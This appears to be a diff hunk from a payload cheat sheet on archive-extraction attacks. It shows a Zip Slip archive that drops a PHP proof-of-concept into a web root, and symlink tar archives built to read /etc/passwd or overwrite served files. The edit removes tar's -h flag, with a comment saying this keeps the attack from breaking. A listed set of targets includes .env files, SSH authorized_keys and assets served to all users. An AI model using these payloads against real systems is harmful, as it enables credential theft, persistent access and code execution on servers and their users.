@@ -215,9 +215,10 @@ with zipfile.ZipFile("zipslip.zip","w") as z:
     z.writestr("../../../../var/www/html/poc.php", '<?php echo "RCE-POC-".php_uname(); ?>')
 ```
 ```bash
-# Symlink archive — read/overwrite host files on extraction (tar preserves symlinks):
-ln -s /etc/passwd link && tar -chf evil.tar link          # app serves "link" back → reads /etc/passwd
-ln -s /var/www/html webroot && tar -chf evil.tar webroot  # then write THROUGH the link to drop/overwrite a served file
+# Symlink archive — read/overwrite host files on extraction (tar stores the symlink ENTRY; do NOT use -h,
+# which dereferences and archives the target's content instead, breaking the attack):
+ln -s /etc/passwd link && tar -cf evil.tar link          # app serves "link" back → reads /etc/passwd
+ln -s /var/www/html webroot && tar -cf evil.tar webroot  # then write THROUGH the link to drop/overwrite a served file
 # targets: /etc/passwd · app config/.env · ~/.ssh/authorized_keys · a JS/HTML asset served to all users
 ```
 
